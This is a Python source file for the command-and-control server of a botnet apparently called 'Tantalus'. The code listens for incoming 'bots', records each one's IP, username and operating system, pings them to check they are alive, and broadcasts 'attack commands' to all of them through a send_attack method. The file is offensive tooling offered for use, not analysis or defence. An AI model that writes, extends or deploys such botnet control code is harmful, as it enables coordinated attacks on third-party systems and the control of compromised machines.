#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: core/server/socket.py
"""

import sys
import socket

from core.data.data import *
from core.other.tools import *
from core.other.output import *


class Socket(Dataclass):
	"""Socket Server Source"""

	def __init__(self, connect: tuple[str, int]=("0.0.0.0", 5000)):
		Dataclass.__init__(self)

		self.addresses = []
		self.connections = []
		self.latest_bot = None
		self.stop = False

		print_logo()
		os.system(f"title Bots Connected: 0 ^| Latest Bot: None ^| Active Threads: {active_count()}")

		while self._create_socket(connect):
			self.listen_for_command()

	def broadcast(self, data: str) -> int:
		"""send a message to all connections

		:param str data: online
		:return: number of bots data was sent to
		:rtype: int
		"""

		online = 0
		for i, (ip, port) in enumerate(self.addresses):
			try:
				__packet__ = self.connections[i].send(data.encode())
				online += 1
			except (BrokenPipeError, ConnectionResetError):
				del self.session_bots[i]
				del self.addresses[i]
				del self.connections[i]
		return online

	def ping_bots(self, hello_message: str):
		"""send ping to all bots and print response packets with tabulate

		:param str hello_message: simple message to ping with
		:return: None
		"""

		if len(self.addresses) == 0:
			info("No connected machines!")
			return

		scanned_bots = []
		for i, (ip, port) in enumerate(self.addresses):
			try:
				__hellopckt__ = self.connections[i].send(hello_message.encode())
				__heartbeat__ = self.connections[i].recv(1024*5)
				scanned_bots.append((i, ip, port, "Alive"))
			except (BrokenPipeError, ConnectionResetError):
				scanned_bots.append((ip, port, "Dead"))
				del self.session_bots[i]
				del self.addresses[i]
				del self.connections[i]

		print_scanned_bots(scanned_bots)

	def send_attack(self, attack_cmd: list):
		"""broadcast attack command

		:param list attack_cmd: attack arguments
		:return: None
		"""

		online = self.broadcast(attack_cmd)
		plus(f"{online} bots recieved attack commands")

	def exit_gracefully(self, signum: tuple[str, object]="", frame: tuple[str, object]=""):
		"""stop input loop and close all socket connections

		:param tuple signum: signed exit signal
		:param tuple frame: exit frame
		:return: None
		"""

		print()
		warn("Exiting Tantalus...")
		self.stop = True
		self.sock.close()
		sys.exit(0)

	def _create_socket(self, connect: tuple[str, int]) -> bool:
		"""bind socket and listen for connections

		:param tuple connection: online
		:rtype: bool
		:return: if socket connection is successful
		"""

		try:
			self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.sock.bind(connect)
			self.sock.listen(50)
			self.sock.settimeout(0.5)
		except OSError:
			pass

		start_threads(func=self._accept_connections, threads=2)

		return True

	def _accept_connections(self) -> None:
		"""accept bots and add to database and session_bots using Bot dataclass"""

		while not self.stop:
			try:
				raw_conn, address = self.sock.accept()

				ip, port = address
				system_information = raw_conn.recv(1024*5).decode("ascii").split('|')
				username, os = system_information

				self.addresses.append(address)
				self.connections.append(raw_conn)

				id = len(self.addresses)
				connected = get_time()
				self.latest_bot = Dataclass.Bot(id=id, port=port, ip=ip,
									  username=username, os=os, connected=connected)

				if self.latest_bot not in self.session_bots:
					self.add_connection(id, username, ip, port, os, connected)
					self.session_bots.append(self.latest_bot)

				start_threads(func=self.console_title, threads=4)
			except (socket.timeout, socket.error):
				continue

	def console_title(self) -> None:
		"""threaded console title with bot information"""

		os.system(
			f"title Bots Connected: {len(self.session_bots)} "
			f"^| Latest Bot: {self.latest_bot.username} "
			f"({self.latest_bot.ip}:{self.latest_bot.port}) "
			f"^| Thread Count: {active_count()}"
		)